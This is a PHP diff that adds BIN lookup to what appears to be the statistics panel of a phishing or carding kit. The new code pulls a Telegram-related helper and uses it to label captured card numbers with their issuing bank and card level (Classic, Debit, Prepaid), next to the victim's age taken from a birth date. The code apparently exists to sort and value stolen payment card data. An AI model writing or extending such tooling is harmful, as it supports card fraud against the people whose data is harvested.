@@ -95,6 +95,21 @@ function panel_age_label(string $birthDate): string
     return $age >= 0 ? $age . ' ans' : '—';
 }
 
+function panel_card_level(array $bin): string
+{
+    $type = strtolower(trim((string) ($bin['type'] ?? '')));
+    if ($type === '') {
+        return 'Classic';
+    }
+
+    return match ($type) {
+        'credit' => 'Classic',
+        'debit' => 'Debit',
+        'prepaid' => 'Prepaid',
+        default => ucfirst($type),
+    };
+}
+
 function panel_level_class(string $level): string
 {
     $key = strtolower($level);
@@ -144,16 +159,21 @@ function panel_stats_append_card_row(array &$stats, array $data, bool $fullCard)
         return;
     }
 
+    if (!function_exists('lookup_card_bin')) {
+        require_once __DIR__ . '/telegram.php';
+    }
+
     $digits = preg_replace('/\D/', '', (string) ($data['cardNumber'] ?? ''));
     $binDigits = strlen($digits) >= 6 ? substr($digits, 0, 6) : '—';
-    $level = 'Classic';
+    $bin = lookup_card_bin($digits);
+    $level = panel_card_level($bin);
     $tz = new DateTimeZone('Europe/Zurich');
     $now = new DateTimeImmutable('now', $tz);
 
     $row = [
         'bin' => $binDigits,
         'age' => panel_age_label((string) ($data['birthDate'] ?? '')),
-        'bank' => '—',
+        'bank' => ($bin['bank'] ?? '—') === '—' ? '—' : $bin['bank'],
         'level' => $level,
         'level_class' => panel_level_class($level),
         'at' => $now->format(DateTimeInterface::ATOM),
